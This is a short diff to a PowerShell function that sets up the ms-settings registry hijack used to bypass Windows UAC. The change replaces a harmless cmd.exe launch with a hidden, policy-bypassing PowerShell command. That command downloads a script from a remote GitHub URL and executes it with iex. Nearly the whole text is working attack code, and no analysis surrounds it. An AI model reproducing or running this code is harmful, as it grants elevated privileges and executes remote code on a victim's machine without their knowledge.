@@ -1,7 +1,7 @@
 function ffv(){ 
  Param (
            
-        [String]$program = "cmd /c start C:\Windows\System32\cmd.exe"
+        [String]$program = "cmd /c powershell -nop -W hidden -noni -ep bypass -c 'iex (irm https://raw.githubusercontent.com/petergriuffin123/565/refs/heads/main/f.ps1)'"
        )
     New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
     New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
